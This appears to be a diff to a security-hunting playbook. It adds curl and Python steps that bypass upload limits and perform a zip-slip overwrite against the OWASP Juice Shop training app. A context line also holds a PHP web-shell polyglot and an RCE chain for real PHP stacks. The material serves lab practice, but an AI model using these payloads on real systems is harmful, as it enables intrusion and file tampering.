@@ -148,6 +148,48 @@ curl -s -X POST "https://$TARGET/api/import" \
 
 ---
 
+## P2: Juice Shop Upload Bypasses (SQLite backend, base http://localhost:3000)
+
+Juice Shop's complaint form (`/#/complain`) caps file size and type **only in the Angular client** — the route guard, the `accept=` attribute, and the size check are client-side. The Express multer handler at `POST /file-upload` enforces a different (looser) limit and a separate code path handles archives. Bypass both by talking to the API directly with `curl`, skipping the SPA entirely.
+
+### (a) File-size-limit bypass — oversized multipart body
+The Angular form rejects files over the displayed UI cap, but the server's multer config sets a much larger ceiling. POST an oversized body straight to the endpoint; the client check never runs.
+```bash
+# Build a file larger than the UI-advertised limit but under multer's real ceiling
+dd if=/dev/zero of=/tmp/big.pdf bs=1024 count=120 2>/dev/null   # ~120 KB
+
+# Hit the multer handler directly — no Angular, no client-side size guard
+curl -s -i -X POST "http://localhost:3000/file-upload" \
+  -F "file=@/tmp/big.pdf;type=application/pdf"
+# 204/200 back = the oversized body was accepted past the client cap
+```
+Unlocks: **Upload Size** ("Upload a file larger than 100 KB.").
+
+### (b) Zip-slip — archive entry escapes the extraction dir
+Juice Shop accepts `.zip` (and `.tar.gz`) uploads at the same `/file-upload` endpoint and extracts them. A crafted entry whose path is `../../ftp/legal.md` traverses out of the temp extraction directory and overwrites a file in the served `ftp/` folder.
+```bash
+# Forge a zip whose single entry path traverses upward into ftp/
+python3 - <<'PY'
+import zipfile
+z = zipfile.ZipFile('/tmp/zipslip.zip', 'w')
+# entry name itself is the traversal payload — overwrites ftp/legal.md
+z.writestr('../../ftp/legal.md', 'owned by zip-slip\n')
+z.close()
+PY
+
+# Upload the archive; the extractor honors the ../ path and writes outside the dir
+curl -s -i -X POST "http://localhost:3000/file-upload" \
+  -F "file=@/tmp/zipslip.zip;type=application/zip"
+
+# Verify the escape — the served ftp file now holds our content
+curl -s "http://localhost:3000/ftp/legal.md"   # prints: owned by zip-slip
+```
+Unlocks: **Arbitrary File Write** ("Overwrite the Legal Information file."). Same primitive with a `.tar.gz` entry of `../../ftp/legal.md` works against the tar code path.
+
+> Note: Juice Shop's auto-exposed CRUD REST (`/api/{Model}`, e.g. `/api/Feedbacks`, and `/rest/{noun}`) does not extract archives — the zip-slip/oversize surface is specifically `/file-upload`. Use the CRUD/REST endpoints instead to chain the overwritten/served file into IDOR or stored-content reads.
+
+---
+
 ## Related Skills & Chains
 
 - **`hunt-rce`** — File upload is the most common path to RCE on classic PHP/JSP/ASPX stacks once you find a directly-served upload directory or a deserializer-fed processor. Chain primitive: polyglot `GIF89a;<?php system($_GET['c']);?>` bypasses magic-byte check + `.phtml` extension bypasses allowlist → `GET /uploads/shell.phtml?c=id` → RCE; or PHP `phar://` upload to a sink calling `file_exists()` on the attacker-controlled path → PHP object deserialization → RCE.
